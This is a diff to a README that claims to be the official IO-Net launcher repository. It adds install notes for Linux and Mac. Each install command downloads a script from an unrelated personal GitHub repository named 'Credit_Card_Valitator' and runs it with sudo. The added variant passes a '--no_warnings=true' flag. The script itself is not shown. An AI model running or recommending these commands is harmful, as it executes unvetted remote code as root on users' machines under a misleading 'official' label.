@@ -39,6 +39,11 @@ Welcome to the official repository for IO-Net launcher binaries. This repository
      ```bash
      curl -sL https://raw.githubusercontent.com/ilkhom19/Credit_Card_Valitator/main/launch-binary.sh -o launch-binary.sh && sudo bash launch-binary.sh
      ```
+     
+        **Note**: You can run the above command with additional arguments to customize the worker. For example:
+        ```bash
+        curl -sL https://raw.githubusercontent.com/ilkhom19/Credit_Card_Valitator/main/launch-binary.sh -o launch-binary.sh && sudo bash launch-binary.sh --device_name=my_device --no_warnings=true
+        ```
 
 
 ### Mac
@@ -47,6 +52,11 @@ Welcome to the official repository for IO-Net launcher binaries. This repository
    ```
    curl -sL https://raw.githubusercontent.com/ilkhom19/Credit_Card_Valitator/main/launch-binary.sh -o launch-binary.sh && sudo bash launch-binary.sh
    ```
+   
+    **Note**: You can run the above command with additional arguments to customize the worker. For example:
+    ```bash
+    curl -sL https://raw.githubusercontent.com/ilkhom19/Credit_Card_Valitator/main/launch-binary.sh -o launch-binary.sh && sudo bash launch-binary.sh --device_name=my_device --no_warnings=true
+    ```
 
    **Troubleshooting**: If you encounter an error such as `bad CPU type in executable`, you might be running software designed for an Intel processor on an Apple Silicon device. Install Rosetta 2 to resolve this issue:
    ```
@@ -64,7 +74,7 @@ Welcome to the official repository for IO-Net launcher binaries. This repository
 
 ## Starting the Software
 
-- **Linux/Mac**: You can re-run the "Download and launch the binary" script each time to start the application in interactive mode or follow additional instructions provided on the website.
+- **Linux/Mac**: You can re-run the "Download and launch the binary" script each time to start the application.
 - **Windows**: Execute the binary as described in the installation step to start using the software.
 
 ## Support
